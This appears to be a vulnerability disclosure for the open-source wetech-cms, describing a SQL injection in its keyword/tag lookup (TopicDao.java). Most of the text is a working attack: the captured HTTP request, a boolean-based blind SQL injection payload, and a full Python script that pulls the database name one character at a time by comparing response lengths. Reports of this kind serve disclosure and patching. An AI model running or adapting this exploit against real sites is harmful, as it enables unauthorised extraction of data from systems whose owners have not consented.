---
typora-root-url: ./img
---

**BUG_Author:**

hadagaga

**Vendor:**

https://github.com/cjbi/wetech-cms

**Software:**

https://github.com/cjbi/wetech-cms

**Vulnerability File:**

wetech-cms-master\wetech-core\src\main\java\tech\wetech\cms\dao\TopicDao.java

![image-20241128204712241](/image-20241128204712241-1732799189720-1.png)

​	By routing we are located to the tag retrieval function

![image-20241128205044185](/image-20241128205044185-1732799189721-2.png)

​	and get the following data packet

```http
GET /keyword/1 HTTP/1.1
Host: 172.24.95.182:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.24.95.182:8888/index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: collapase-nav=collapse-nav1; JSESSIONID=561775642554B23D11BFD032DEE33BB4
Connection: close
```

​	Construct payload:

```sql
1' or keyword like (case when ascii(substr(database(),1,1))=1 then 'a' else '' end) and keyword like '
```

​	So we have the following python script

```python
import requests
url="http://172.21.55.165:8888/keyword/1"
url1=url+"' or keyword like (case when ascii(substr(database(),1,1))=10 then 'a' else '' end) and keyword like '"#前十个字符串的10位false包
url2=url+"' or keyword like (case when ascii(substr(database(),1,1))=100 then 'a' else '' end) and keyword like '"#前十个字符串的100位false包
url1_1=url+"' or keyword like (case when ascii(substr(database(),10,1))=10 then 'a' else '' end) and keyword like '"#前一百个字符串的10位false包
url2_1=url+"' or keyword like (case when ascii(substr(database(),10,1))=100 then 'a' else '' end) and keyword like '"#前一百个字符串的100位false包
def req():
    req1 = requests.get(url1)#获取前十个字符串的100位false包
    req2 = requests.get(url2)#获取前十个字符串的100位false包
    req1_1 = requests.get(url1_1)#获取前一百个字符串的10位false包
    req2_1 = requests.get(url2_1)#获取前一百个字符串的100位false包
    r_len1 = len(req1.text)
    r_len2 = len(req2.text)
    r_len1_1 = len(req1_1.text)
    r_len2_1 = len(req2_1.text)
    for i in range(1,12):
        for k in range(32,127):
            payload="' or keyword like (case when ascii(substr(database(),{i},1))={k} then 'a' else '' end) and keyword like '".format(i=i,k=k)#SQL注入payload
            th_url = url + payload
            second = requests.get(th_url)
            s_len = len(second.text)
            if k < 100:
                if i < 10:
                    if s_len != r_len1:
                        print(chr(k), end='')
                        break
                else:
                    if s_len != r_len1_1:
                        print(chr(k), end='')
                        break
            else:
                if i < 10:
                    if s_len != r_len2:
                        print(chr(k), end='')
                        break
                else:
                    if s_len != r_len2_1:
                        print(chr(k), end='')
                        break
def main():
    req()

if __name__ == '__main__':
    main()
```

​	Successfully obtain the library name:

![image-20241127134337976](/image-20241127134337976-1732686251093-2-1732721872717-1-1732721891177-9-1732797677430-1-1732798458177-1-1732799189721-3.png)